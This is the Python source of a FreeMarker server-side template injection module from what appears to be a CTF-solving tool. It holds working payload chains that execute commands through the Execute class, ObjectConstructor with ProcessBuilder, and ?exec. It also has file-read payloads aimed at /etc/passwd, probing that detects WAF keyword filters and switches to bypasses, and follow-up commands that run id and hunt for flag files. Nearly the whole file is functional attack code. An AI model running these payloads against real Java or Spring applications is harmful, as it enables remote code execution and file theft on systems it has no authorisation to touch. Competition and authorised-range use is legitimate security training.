"""
CTF 解题工具 — FreeMarker 引擎模块
用途: 面向 CTF 竞赛的 FreeMarker (Java/Spring) SSTI 自动化解题辅助
场景: 竞赛平台题目 / 授权测试靶场

特点:
  - ?new() 实例化 Execute 类是经典利用方式
  - ?api 访问 Java API (FreeMarker 2.3.22+)
  - ObjectConstructor 类可实例化任意 Java 对象
  - 检测用 ${7*7}→49（与 Java EL 区分用 indexOf 指纹）
"""

from .base import BaseEngine
from .utils import is_waf_blocked


BYPASS_STRATEGIES = [
    {
        'name': '无过滤（Execute 类）',
        'filters': set(),
        'rce': '<#assign value="freemarker.template.utility.Execute"?new()>${value("CMD")}',
        'file_read': '<#include "FILEPATH">',
    },
    {
        'name': '过滤 Execute 关键字（ObjectConstructor）',
        'filters': {'keyword'},
        'rce': 'freemarker_objconst_bypass',
        'file_read': None,
    },
]


class FreeMarkerEngine(BaseEngine):
    """FreeMarker (Java/Spring) SSTI 引擎"""

    name = 'freemarker'
    template_tags = ('${', '}', '<#', '#>')
    error_keywords = [
        'JavaMethod', 'ExpressionException', 'TemplateException',
        'ParseException', 'Internal Server Error',
        'freemarker.core', 'java.lang.',
    ]

    detect_payloads = [
        {'payload': '${7*7}', 'expected': '49', 'engines': ['freemarker']},
        {'payload': '${7*7?}', 'expected': '49', 'engines': ['freemarker']},
    ]

    fingerprints = [
        {"payload": '${7*7}', "expected": "49", "desc": "FreeMarker 基本运算"},
        {"payload": '${"freemarker".indexOf("marker")}', "expected": "4", "desc": "FreeMarker 字符串方法"},
    ]

    rce_chains = [
        '<#assign value="freemarker.template.utility.Execute"?new()>${value("CMD")}',
        '<#assign cmd="CMD"><#assign ex=cmd?exec>${ex}',
        '<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","CMD").start()}',
    ]

    file_read_chains = [
        '<#include "FILEPATH">',
    ]

    bypass_strategies = BYPASS_STRATEGIES

    def probe_waf(self, toolkit):
        """FreeMarker WAF 探测"""
        filters = set()
        filtered_keywords = set()

        t = toolkit.send_and_clean('${7*7}')
        if '49' not in t:
            return filters, filtered_keywords

        # 空格
        t = toolkit.send_and_clean('${7 * 7}')
        if '49' not in t:
            filters.add('space')

        # 关键字探测
        for kw in ['Execute', 'ObjectConstructor', 'JythonRuntime', 'assign', 'include']:
            if kw == 'Execute':
                payload = '<#assign value="freemarker.template.utility.Execute"?new()>${value("id")}'
            elif kw == 'ObjectConstructor':
                payload = '<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.String","test")}'
            elif kw == 'assign':
                payload = '<#assign x=1>${x}'
            elif kw == 'include':
                payload = '<#include "/etc/passwd">'
            else:
                continue
            t = toolkit.send_and_clean(payload)
            if is_waf_blocked(t):
                filtered_keywords.add(kw)

        if filtered_keywords:
            filters.add('keyword')

        # ?new 可用性
        t = toolkit.send_and_clean('${"freemarker.template.utility.Execute"?new()}')
        if is_waf_blocked(t):
            filters.add('new')
        else:
            print("  [+] ?new() 可用")

        # ?api 可用性
        t = toolkit.send_and_clean('${object?api}')
        if not is_waf_blocked(t):
            print("  [+] ?api 可用")

        self.waf_filters = filters
        self.filtered_keywords = filtered_keywords
        return filters, filtered_keywords

    def build_rce_payload(self, cmd, toolkit=None):
        """FreeMarker RCE payload 构造"""
        strategy = getattr(toolkit, 'working_bypass', None) if toolkit else None

        if strategy and strategy['rce'] == 'freemarker_objconst_bypass':
            # Execute 被过滤时用 ObjectConstructor
            if 'ObjectConstructor' not in self.filtered_keywords:
                payload = '<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","CMD").start()}'
                return payload.replace('CMD', cmd), None
            # 用 ?exec
            if 'exec' not in self.filtered_keywords:
                return f'<#assign cmd="{cmd}"><#assign ex=cmd?exec>${{ex}}', None
            return None, None

        if strategy and isinstance(strategy['rce'], str) and 'CMD' in strategy['rce']:
            return strategy['rce'].replace('CMD', cmd), None

        for chain in self.rce_chains:
            return chain.replace('CMD', cmd), None
        return None, None

    def build_file_payload(self, filepath, toolkit=None):
        """FreeMarker 文件读取 payload"""
        # <#include> 方式
        if 'include' not in self.filtered_keywords:
            return f'<#include "{filepath}">', None
        # ObjectConstructor + FileReader
        if 'ObjectConstructor' not in self.filtered_keywords:
            payload = (
                '<#assign value="freemarker.template.utility.ObjectConstructor"?new()">'
                '${value("java.io.FileReader","FILEPATH")}'
            )
            return payload.replace('FILEPATH', filepath), None
        for chain in self.file_read_chains:
            return chain.replace('FILEPATH', filepath), None
        return None, None

    def is_rce_output(self, text, cmd, toolkit=None):
        if not text or len(text) < 2:
            return False
        if is_waf_blocked(text):
            return False
        if '${' in text or '<#' in text:
            return False
        for kw in self.error_keywords:
            if kw in text:
                return False
        if cmd == 'id':
            return 'uid=' in text or 'gid=' in text
        return len(text) > 0

    def info_gathering(self, toolkit):
        """FreeMarker 信息收集"""
        print("\n" + "=" * 60)
        print("[*] 信息收集 (FreeMarker)")
        print("=" * 60)

        # FreeMarker 版本
        text = toolkit.send_and_clean('${.version}')
        if text and not is_waf_blocked(text):
            print(f"  FreeMarker 版本: {text}")

        # 数据模型
        text = toolkit.send_and_clean('<#list .data_model?keys as k>${k}</#list>')
        if text and not is_waf_blocked(text):
            print(f"  数据模型键: {text[:300]}")

        # 通过 RCE 收集
        if toolkit.working_chain:
            print("\n  [1] 系统信息 (通过 RCE):")
            output = toolkit.exec_cmd('id')
            if output:
                print(f"      {output[:300]}")

            print("\n  [2] 寻找 flag 文件:")
            output = toolkit.exec_cmd('find / -name "flag*" -type f 2>/dev/null | head -20')
            if output:
                print(f"      {output[:500]}")
            output = toolkit.exec_cmd('cat /flag 2>/dev/null; cat /flag.txt 2>/dev/null')
            if output:
                print(f"      [+] flag: {output}")
